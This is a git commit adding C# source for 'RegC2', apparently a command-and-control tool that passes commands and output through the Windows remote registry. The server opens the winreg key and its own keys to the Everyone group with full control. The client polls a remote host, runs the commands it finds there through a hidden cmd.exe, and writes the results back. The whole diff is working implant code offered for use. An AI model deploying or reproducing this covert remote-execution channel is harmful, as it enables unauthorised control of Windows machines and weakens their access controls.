11746eac24729143da02a562d8adf07705c95d65
0xfenrik <0xfenrik@protonmail.com>
2022-08-17 08:33:43 +0200

    Add project files.

---
+++ RegC2Client/Program.cs
@@ -0,0 +1,170 @@
+﻿using System;
+using System.Diagnostics;
+using Microsoft.Win32;
+
+
+namespace RegC2Client
+{
+    internal class Program
+    {
+
+        public static string GetCommand(string host, string registrykey)
+        {
+            RegistryKey myReg;
+            string cmd = "Errors";
+
+            try
+            {
+                myReg = RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, host).OpenSubKey(@"SOFTWARE\RegistryC2\"+ registrykey);
+
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+                return cmd;
+            }
+
+            cmd = myReg.GetValue("cmd").ToString();
+            Console.WriteLine("Command to execute:  {0}  ", cmd);
+            myReg.Close();
+
+            return cmd;
+        }
+
+        public static string RunCommand(string command)
+        {
+
+            string argument = "/C " + command;
+            Process p = new Process();
+            // Specifies not to use system shell to start the process
+            p.StartInfo.UseShellExecute = false;
+            // Instructs the process should not start in a separate window
+            p.StartInfo.CreateNoWindow = true;
+            // Indicates whether the output of the application is returned as an output stream
+            p.StartInfo.RedirectStandardOutput = true;
+            p.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
+            p.StartInfo.Arguments = argument;
+            p.Start();
+            string res = p.StandardOutput.ReadToEnd();
+            Console.WriteLine(res);
+            return res;
+        }
+
+        public static bool PostOutput(string host, string registrykey, string output)
+        {
+            RegistryKey myReg;
+
+            try
+            {
+                myReg = RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, host).OpenSubKey(@"SOFTWARE\RegistryC2\" + registrykey, true);
+
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+                return false;
+            }
+            try
+            {
+                myReg.SetValue("output", output);
+            } catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+                return false;
+            }
+
+            Console.WriteLine("Output updated successfully");
+            myReg.Close();
+
+            return true;
+        }
+
+        public static int GetSleepTime(string host, string registrykey)
+        {
+            int sleepTime = 30;
+            RegistryKey myReg;
+
+            try
+            {
+                myReg = RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, host).OpenSubKey(@"SOFTWARE\RegistryC2\" + registrykey);
+
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+                Console.WriteLine("Failed to find new sleeptime... keeping it at 30");
+                return sleepTime;
+            }
+
+            sleepTime = Int32.Parse(myReg.GetValue("sleep").ToString());
+            Console.WriteLine("Sleep time is:  {0}  ", sleepTime);
+            myReg.Close();
+
+            return sleepTime;
+        }
+
+        public static string GetOutput(string host, string registrykey)
+        {
+            RegistryKey myReg;
+            string output = "Error";
+
+            try
+            {
+                myReg = RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, host).OpenSubKey(@"SOFTWARE\RegistryC2\" + registrykey);
+
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+                return output;
+            }
+
+            output = myReg.GetValue("output").ToString();
+            myReg.Close();
+
+            return output;
+        }
+
+        public static void Main(string[] args)
+        {
+
+            bool active = true;
+            if (args.Length != 2)
+            {
+                Console.WriteLine("RegC2Client.exe <host> <Registry name to use>");
+                Console.WriteLine("RegC2Client.exe WS01 client01");
+                Environment.Exit(0);
+            }
+            string host = args[0];
+            string registrykey = args[1];
+
+            int sleeptime = GetSleepTime(host, registrykey);
+
+            DateTime stopTime = DateTime.Now.AddSeconds(sleeptime);
+
+            while (active)
+            {
+                DateTime startTime = DateTime.Now;
+                if (startTime >= stopTime)
+                {
+                    string command = GetCommand(host, registrykey);
+                    if (command == "Exit")
+                    {
+                        Console.WriteLine("Shutting down");
+                        return;
+                    }
+                    string lastOutput = GetOutput(host, registrykey);
+
+
+                    if (lastOutput.Length <= 0)
+                    {
+                        string output = RunCommand(command);
+                        PostOutput(host, registrykey, output);
+                    }
+
+                    stopTime = DateTime.Now.AddSeconds(GetSleepTime(host, registrykey));
+                }
+            }
+        }
+    }
+}
---
+++ RegC2Server/Program.cs
@@ -0,0 +1,231 @@
+﻿using System;
+using System.Security.AccessControl;
+using System.Security.Principal;
+using Microsoft.Win32;
+
+
+namespace RegC2Server
+{
+    internal class Program
+    {
+
+        static void RunCmd(string registrykey, string cmd)
+        {
+            string newcmd = cmd.Split(' ')[1];
+
+            RegistryKey myReg;
+            try
+            {
+                myReg = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\RegistryC2\"+registrykey, true);
+                myReg.SetValue("cmd", newcmd);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+                return;
+            }
+            Console.WriteLine("CMd updated to: {0}", myReg.GetValue("cmd"));
+
+            //Read output when available
+            myReg.SetValue("output", "");
+            Console.WriteLine(myReg.GetValue("output").ToString().Equals(""));
+            while(true)
+            {
+                if (myReg.GetValue("output").ToString().Length > 0)
+                {
+                    Console.WriteLine(myReg.GetValue("output"));
+                    break;
+                }
+
+            }
+            myReg.Close();
+        }
+
+        static void UpdateSleep(string registryKey, string cmd)
+        {
+            string sleepTime = cmd.Split(' ')[1];
+            int i = 0;
+            bool isInt = int.TryParse(sleepTime, out i);
+
+            if (!isInt)
+            {
+                Console.WriteLine("Please provide an int when using the sleep command");
+                return;
+            }
+            RegistryKey myReg;
+            try
+            {
+                myReg = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\RegistryC2\" + registryKey, true);
+                myReg.SetValue("sleep", i);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+                return;
+            }
+            Console.WriteLine("Sleep updated to: {0}", myReg.GetValue("sleep"));
+            myReg.Close();
+
+        }
+
+        static void PrintHelp()
+        {
+            Console.WriteLine(
+                "sleep 10         Sets the sleep time to 10\n" +
+                "cmd whoami       Executes whoami\n" +
+                "exit             Exits the application gracefully");
+        }
+
+        static void StartRemoteRegistry()
+        {
+
+        }
+
+        static void SetupRegistryKeys(string registrykey)
+        {
+            //Check if the base Registry key is created (HKLM\Software\RegistryC2
+            if (Registry.LocalMachine.OpenSubKey(@"SOFTWARE\RegistryC2", false) == null)
+            {
+                Registry.LocalMachine.CreateSubKey(@"SOFTWARE\RegistryC2");
+            }
+
+            if (Registry.LocalMachine.OpenSubKey(@"SOFTWARE\RegistryC2\" + registrykey, false) == null)
+            {
+                Console.WriteLine("Registry key doesn't exist. Trying to create them...");
+                try
+                {
+                    RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\RegistryC2\" + registrykey);
+                    key.SetValue("cmd", "whoami");
+                    key.SetValue("output", "");
+                    key.SetValue("sleep", 30);
+                    key.Close();
+                } catch (Exception ex)
+                {
+                    Console.WriteLine("Failed... : " + ex.Message);
+                    Environment.Exit(0);
+                }
+                Console.WriteLine("[+] Registry keys created... Setting up permissions");
+                ChangeRegistryPermissions(@"SOFTWARE\RegistryC2\" + registrykey, true);
+            }
+            Console.WriteLine("[+] Key already exists.. Continuing...");
+        }
+
+        // Set WinReg permissions
+        // https://support.microsoft.com/fr-fr/topic/you-receive-an-error-message-when-you-try-to-access-the-registry-or-event-viewer-on-a-remote-computer-that-runs-windows-xp-professional-a7e41517-873e-7d10-624b-22e311b6cac1
+
+        static void ChangeRegistryPermissions(string registrykey, bool allow)
+        {
+            //RegistryKey myReg = Registry.LocalMachine.OpenSubKey(registrykey, true);
+            RegistryKey myReg = Registry.LocalMachine.OpenSubKey(registrykey, RegistryKeyPermissionCheck.ReadWriteSubTree);
+
+           SecurityIdentifier si = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
+
+            RegistrySecurity rs = myReg.GetAccessControl();
+
+            if (allow)
+            {
+                try
+                {
+                    Console.WriteLine("Applying rule to: " + myReg.Name);
+                    rs.AddAccessRule(new RegistryAccessRule(si,
+                    RegistryRights.WriteKey
+                    | RegistryRights.ReadKey
+                    | RegistryRights.Delete
+                    | RegistryRights.FullControl,
+                    AccessControlType.Allow));
+                    myReg.SetAccessControl(rs);
+
+                    rs = myReg.GetAccessControl();
+                    foreach (RegistryAccessRule ar in rs.GetAccessRules(true, true, typeof(NTAccount)))
+                    {
+                        Console.WriteLine("        User: {0}", ar.IdentityReference);
+                        Console.WriteLine("        Type: {0}", ar.AccessControlType);
+                        Console.WriteLine("      Rights: {0}", ar.RegistryRights);
+                        Console.WriteLine(" Inheritance: {0}", ar.InheritanceFlags);
+                        Console.WriteLine(" Propagation: {0}", ar.PropagationFlags);
+                        Console.WriteLine("   Inherited? {0}", ar.IsInherited);
+                        Console.WriteLine();
+                    }
+                    myReg.Close();
+
+                } catch (Exception ex)
+                {
+                    Console.WriteLine(ex.Message);
+                }
+            } else
+            {
+                try
+                {
+                    Console.WriteLine("Removing rule for:" + myReg.Name);
+                    rs.RemoveAccessRule(new RegistryAccessRule(si,
+                    RegistryRights.WriteKey
+                    | RegistryRights.ReadKey
+                    | RegistryRights.Delete
+                    | RegistryRights.FullControl,
+                    AccessControlType.Allow));
+                    myReg.SetAccessControl(rs);
+                    myReg.Close();
+
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine(ex.Message);
+                }
+                }
+        }
+
+        static void Main(string[] args)
+        {
+            if (args.Length != 1)
+            {
+                Console.WriteLine("RegC2Server.exe <Unique Registry key name to use>\n" +
+                                  "RegC2Server.exe ws01");
+                return;
+            }
+
+            //Catching Ctrl + C events to clean up correctly
+            Console.CancelKeyPress += delegate
+            {
+                ChangeRegistryPermissions(@"SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg", false);
+                ChangeRegistryPermissions(@"SOFTWARE\RegistryC2\" + args[0], false);
+                //Environment.Exit(0);
+            };
+
+            Console.WriteLine("[+] Welcome to RegC2");
+
+            Console.WriteLine("[+] Setting up permissions to WinReg...");
+            ChangeRegistryPermissions(@"SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg", true);
+            
+            Console.WriteLine("[+] Setting up Registry keys...");
+            SetupRegistryKeys(args[0]);
+
+            Console.WriteLine("[+] Ready...");
+            while (true)
+            {
+                Console.Write("> ");
+                string cmd = Console.ReadLine();
+                if (cmd == "h" || cmd == "help")
+                {
+                    PrintHelp();
+                }
+
+                if (cmd.StartsWith("sleep", StringComparison.OrdinalIgnoreCase))
+                {
+                    UpdateSleep(args[0], cmd);
+                }
+
+                if (cmd.StartsWith("cmd", StringComparison.OrdinalIgnoreCase))
+                {
+                    RunCmd(args[0], cmd);
+                }
+
+                if (cmd.StartsWith("exit", StringComparison.OrdinalIgnoreCase)) {
+                    ChangeRegistryPermissions(@"SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg", false);
+                    ChangeRegistryPermissions(@"SOFTWARE\RegistryC2\"+args[0], false);
+                    Environment.Exit(0);
+                }
+            }
+
+        }
+    }
+}
